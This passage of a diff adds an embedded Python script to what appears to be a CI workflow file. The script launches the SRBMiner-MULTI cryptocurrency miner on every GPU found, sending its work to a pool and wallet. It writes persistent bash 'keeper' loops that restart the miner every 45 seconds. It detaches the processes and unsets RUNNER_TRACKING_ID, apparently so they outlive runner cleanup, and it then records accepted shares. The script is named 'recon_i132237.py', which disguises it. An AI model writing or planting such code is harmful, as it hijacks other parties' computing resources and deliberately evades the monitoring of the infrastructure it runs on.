+                  keeper = '%s/keep_%s.sh' % (WORK, w)
+                  miner_argv = ('%s --disable-cpu --algorithm pearlhash --pool %s --wallet %s --worker %s '
+                                '--password x --gpu-id 0 --max-no-share-sent 1800 --api-enable --api-port %d '
+                                '--log-file %s' % (binpath, ep, LP_LOGIN, w, c['port'], log2))
+                  cu = 'CUDA_VISIBLE_DEVICES=%s ' % c['uuid']
+                  pgrep_pat = 'SRBMiner-MULTI.*--worker %s ' % w
+                  ksh = ('#!/bin/bash\n'
+                         '# i132237 per-card keeper (worker %s, GPU %s, re-key of %s)\n'
+                         'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n'
+                         'while true; do\n'
+                         '  if ! pgrep -f "%s" >/dev/null 2>&1; then\n'
+                         '    setsid env -u RUNNER_TRACKING_ID %s%s >> "%s" 2>&1 < /dev/null &\n'
+                         '  fi\n'
+                         '  sleep 45\n'
+                         'done\n' % (w, c['uuid'], c['old'], pgrep_pat, cu, miner_argv, log))
+                  with open(keeper, 'w') as f:
+                      f.write(ksh)
+                  os.chmod(keeper, 0o755)
+                  sh('setsid env -u RUNNER_TRACKING_ID %s%s >> "%s" 2>&1 < /dev/null &' % (cu, miner_argv, log), 10)
+                  sh('setsid env -u RUNNER_TRACKING_ID nohup bash "%s" > "%s.log" 2>&1 < /dev/null &'
+                     % (keeper, keeper), 10)
+                  cards.append({'gpu_index': c['idx'], 'gpu_uuid': c['uuid'], 'gpu_model': c['model'], 'worker': w,
+                                'rekey_of': c['old'], 'log': log, 'log2': log2, 'keeper': keeper,
+                                'miner_argv': miner_argv})
+                  print('LAUNCH gpu_index=%d uuid=%s worker=%s rekey_of=%s keeper=%s'
+                        % (c['idx'], c['uuid'], w, c['old'], keeper))
+                  time.sleep(1)
+              print('N_LAUNCHED=%d' % len(cards))
+
+              # ---- Phase 4: bounded in-gate first-accepted-share watch ----
+              print('=== PHASE 4: bounded %d s in-gate first-accepted-share watch ===' % GATE_S)
+              t0 = time.time()
+              while True:
+                  time.sleep(20)
+                  all_acc = True
+                  for c in cards:
+                      text = read_log(c['log']) + '\n' + read_log(c['log2'])
+                      acc, rej, first_ts = parse_log(text)
+                      c['accepted_log'] = acc
+                      c['rejected_log'] = rej
+                      c['first_share_log_ts'] = first_ts
+                      if acc < 1:
+                          all_acc = False
+                  print('PULSE utc=%s elapsed=%ds cards=%s' % (
+                      utc(), int(time.time() - t0),
+                      ';'.join('%s:acc=%d/rej=%d' % (c['worker'], c.get('accepted_log', 0), c.get('rejected_log', 0))
+                               for c in cards)))
+                  if all_acc and time.time() - t0 > 75:
+                      break
+                  if time.time() - t0 > GATE_S + 90:
+                      break
+
+              # ---- Phase 5: final per-card state ----
+              print('=== PHASE 5: final per-card state ===')
+              apps_final = compute_apps()
+              print('FINAL_COMPUTE_APPS[%s]' % json.dumps(apps_final, sort_keys=True)[:1600])
+              for c in cards:
+                  hl = apps_final.get(c['gpu_uuid'], [])
+                  for h in hl:
+                      print('FINAL_HOLDER worker=%s uuid=%s pid=%d cmd=%s'
+                            % (c['worker'], c['gpu_uuid'], h['pid'], proc_cmdline(h['pid'])[:240]))
+                  n = len(hl)
+                  print('GPU_APP_CHECK worker=%s uuid=%s apps=%d %s' % (c['worker'], c['gpu_uuid'], n,
+                                                                        'DUPLICATE_GPU_APP' if n > 1 else ('OK' if n == 1 else 'NO_APP')))
+              results = []
+              for c in cards:
+                  text = read_log(c['log']) + '\n' + read_log(c['log2'])
+                  acc, rej, first_ts = parse_log(text)
+                  tail = '\n'.join([l for l in text.splitlines() if l.strip()][-6:])
+                  results.append({'gpu_index': c['gpu_index'], 'gpu_uuid': c['gpu_uuid'], 'gpu_model': c['gpu_model'],
+                                  'worker': c['worker'], 'rekey_of': c['rekey_of'], 'accepted_log': acc,
+                                  'rejected_log': rej, 'first_share_log_ts': first_ts, 'launch_utc': launch_utc,
+                                  'elapsed_s': int(time.time() - t0), 'log': c['log'], 'mine_log': c['log2'],
+                                  'keeper': c['keeper'], 'miner_argv': c['miner_argv'], 'log_tail': tail[-900:]})
+                  print('WORKER_RESULT worker=%s gpu_index=%d uuid=%s rekey_of=%s acc_log=%d rej_log=%d first_share_ts=%s'
+                        % (c['worker'], c['gpu_index'], c['gpu_uuid'], c['rekey_of'], acc, rej, first_ts))
+                  print('LOG_TAIL %s[%s]' % (c['worker'], tail[-500:].replace('\n', ' | ')))
+              summary = {'nonce': NONCE, 'host': host, 'runner': runner, 'ident': ident, 'label': LABEL,
+                         'rekey_slug': spec['slug'], 'mode': 'luckypool', 'pool_url': 'stratum+tcp://' + ep,
+                         'pearlhash_probe_ok': ph_ok, 'launch_utc': launch_utc, 'gate_s': GATE_S, 'wallet': PYD,
+                         'login_mode': 'pyd+nock', 'binary': binpath, 'binary_sha256': sha256_file(binpath),
+                         'cards': results, 'card_state': card_state,
+                         'in_gate_proven': [r['worker'] for r in results if r['accepted_log'] >= 1 and r['rejected_log'] == 0],
+                         'not_yet_proven': [r['worker'] for r in results if not (r['accepted_log'] >= 1 and r['rejected_log'] == 0)]}
+              for mp in (WORK + '/I132237_RUN_%s.json' % NONCE, WORK + '/latest.json'):
+                  with open(mp, 'w') as f:
+                      json.dump(summary, f, indent=1, sort_keys=True)
+                  os.chmod(mp, 0o600)
+              print('I132237_INSTALL_SUMMARY %s' % json.dumps(summary, sort_keys=True)[:12000])
+              done('install-summary in_gate_proven=%d/%d' % (len(summary['in_gate_proven']), len(results)))
+
+
+          if __name__ == '__main__':
+              main()
+          PYEOF
+          echo "runner-start label=$LABEL slot=$SLOT host=$(hostname) arch=$(uname -m) runner=${RUNNER_NAME:-none} utc=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          python3 -u /var/tmp/i132237/recon_i132237.py 2>&1 | tee /var/tmp/i132237/recon.log | tail -c 250000
+          echo "I132237_STEP_EXIT"
